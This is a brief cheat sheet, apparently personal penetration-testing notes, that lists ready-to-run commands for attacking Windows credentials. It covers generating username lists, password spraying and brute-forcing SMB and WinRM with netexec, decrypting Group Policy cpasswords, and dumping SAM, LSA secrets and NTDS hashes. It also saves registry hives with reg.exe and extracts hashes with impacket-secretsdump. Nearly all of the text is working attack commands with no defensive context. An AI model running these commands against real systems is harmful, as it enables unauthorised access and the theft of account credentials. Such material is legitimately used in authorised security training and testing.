
# Create Wordlist
## username-anarchy

```sh
./username-anarchy -i /path/to/listoffirstandlastnames.txt
```

# Password Spraying

```sh
netexec smb $target -u usernames.list -p 'ChangeMe123!'
```
# Brute Force

## WinRM (users x passwords)

```sh
netexec winrm <ip> -u user.list -p password.list
```

## SMB (user x passwords)

```sh
netexec smb <ip> -u "user" -p "password" --shares
```

# Decrypt Groups.xml

```sh
gpp-decrypt '<cpassword>'
```

# Dumping

## Dump SAM with nxc

Need admin credentials

```bash
netexec smb <ip> --local-auth -u <username> -p <password> --sam
```

## Dump LSA secrets with nxc

Need admin credentials

```bash
netexec smb <ip> --local-auth -u <username> -p <password> --lsa
```

## Dump hashes from NTDS with nxc

Need admin credentials

```bash
netexec smb <ip> -u <username> -p <password> --ntds
```

## Save SAM, SYSTEM & SECURITY

```cmd
reg.exe save hklm\sam C:\sam.save

reg.exe save hklm\system C:\system.save

reg.exe save hklm\security C:\security.save
```

### Crack SAM & SYSTEM

```sh
impacket-secretsdump -sam sam.save -system system.save LOCAL
```